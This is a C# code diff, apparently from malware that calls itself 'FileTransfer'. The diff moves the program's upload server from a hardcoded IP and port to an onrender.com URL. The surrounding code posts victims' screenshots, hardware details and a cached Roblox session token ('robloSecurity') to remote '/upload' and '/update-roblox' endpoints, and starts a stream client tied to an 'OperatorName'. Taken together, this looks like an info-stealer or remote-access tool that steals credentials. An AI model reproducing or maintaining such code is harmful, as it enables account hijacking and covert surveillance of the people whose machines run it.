@@ -34,8 +34,7 @@ namespace FileTransfer
             _http.DefaultRequestHeaders.Accept.ParseAdd("image/webp,image/apng,image/*,*/*;q=0.8");
         }
 
-        private const string ServerIp = "134.249.56.228";
-        private const string ServerPort = "25565";
+        private const string ServerUrl = "https://file-transfer-xxxx.onrender.com";
         private const string OperatorName = "DildMan";
 
         private string? _cpu, _ram, _gpu;
@@ -310,7 +309,7 @@ namespace FileTransfer
                 }
                 catch { }
 
-                string url = $"https://{ServerIp}:{ServerPort}/upload";
+                string url = $"{ServerUrl}/upload";
                 var resp = await _http.PostAsync(url, content);
                 Log($"Upload startup response: {(int)resp.StatusCode}");
             }
@@ -339,7 +338,7 @@ namespace FileTransfer
         private void StartStreamClient()
         {
             if (_streamClient != null) return;
-            _streamClient = new StreamClient(ServerIp, ServerPort, ComputerInfo.GetName(), OperatorName);
+            _streamClient = new StreamClient(ServerUrl, ComputerInfo.GetName(), OperatorName);
             _streamClient.Start();
             Log("Stream client started");
         }
@@ -366,7 +365,7 @@ namespace FileTransfer
                 if (!string.IsNullOrEmpty(_cachedToken))
                     content.Add(new StringContent(_cachedToken), "robloSecurity");
 
-                string url = $"https://{ServerIp}:{ServerPort}/upload";
+                string url = $"{ServerUrl}/upload";
                 var resp = await _http.PostAsync(url, content);
                 Log($"Upload screenshot response: {(int)resp.StatusCode}");
             }
@@ -650,7 +649,7 @@ namespace FileTransfer
                 var jsonUpdate = System.Text.Json.JsonSerializer.Serialize(updatePayload);
                 using var updateContent = new StringContent(jsonUpdate, System.Text.Encoding.UTF8, "application/json");
 
-                string url = $"https://{ServerIp}:{ServerPort}/update-roblox";
+                string url = $"{ServerUrl}/update-roblox";
                 var resp = await _http.PostAsync(url, updateContent);
 
                 if (resp.IsSuccessStatusCode)
